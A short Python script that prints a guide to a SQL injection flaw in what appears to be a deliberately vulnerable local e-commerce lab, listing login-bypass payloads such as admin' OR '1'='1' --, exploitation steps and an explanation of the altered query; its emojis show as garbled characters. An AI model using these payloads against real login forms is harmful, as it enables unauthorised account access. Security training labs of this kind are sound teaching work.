#!/usr/bin/env python3

print("üî• SQL INJECTION VULNERABILITY GUIDE")
print("=" * 60)
print()
print("‚úÖ STATUS: SQL Injection is WORKING and ACTIVE!")
print()
print("üìç VULNERABLE ENDPOINT: http://127.0.0.1:5001/login")
print()
print("üéØ SUCCESSFUL PAYLOADS:")
print("   Username: admin' OR '1'='1' --")
print("   Password: [anything]")
print()
print("   Username: ' OR '1'='1' --") 
print("   Password: [anything]")
print()
print("   Username: admin' OR 1=1 --")
print("   Password: [anything]")
print()
print("üí° HOW TO EXPLOIT:")
print("   1. Go to: http://127.0.0.1:5001/login")
print("   2. In Username field, enter: admin' OR '1'='1' --")
print("   3. In Password field, enter: test (or anything)")
print("   4. Click 'Login'")
print("   5. You'll be redirected to /admin with full admin access!")
print()
print("üîç WHAT HAPPENS BEHIND THE SCENES:")
print("   - Original SQL Query:")
print("     SELECT * FROM users WHERE username = 'admin' AND password = 'hashed_password'")
print()
print("   - Injected SQL Query:")  
print("     SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'anything'")
print()
print("   - The -- comments out the password check")
print("   - '1'='1' is always true, so authentication is bypassed")
print("   - First user returned is 'admin' with admin privileges")
print()
print("üèÜ RESULT: Full admin access to the vulnerable e-commerce platform!")
print()
print("‚ö†Ô∏è  If you're not seeing the injection work in the browser:")
print("   - Clear your browser cache/cookies")
print("   - Use incognito/private browsing mode")
print("   - Try the exact payload: admin' OR '1'='1' --")
print("   - Make sure the application is running at http://127.0.0.1:5001")
print()
print("üî• The vulnerability is confirmed working via automated testing!")
print("=" * 60)
